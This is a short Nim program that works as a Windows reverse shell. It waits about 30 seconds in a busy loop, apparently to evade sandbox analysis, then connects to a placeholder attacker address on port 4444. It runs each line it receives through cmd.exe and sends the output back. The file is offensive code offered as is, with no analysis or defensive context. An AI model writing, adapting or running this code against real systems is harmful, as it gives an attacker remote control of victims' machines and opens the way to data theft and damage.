import net, osproc, strformat, times

let start = now() + 30.seconds
var i = 1


while now() <= start:
  var i = i+1


let 
  ip = "<IP_Addr>"
  port = 4444
  sock = newSocket()


sock.connect(ip, Port(port))
 

let prompt = "Nim-Shell> "
while true:
  send(sock, prompt)
  let bad = recvLine(sock)
  let cmd = execProcess(fmt"cmd.exe /C " & bad)
  send(sock, cmd)
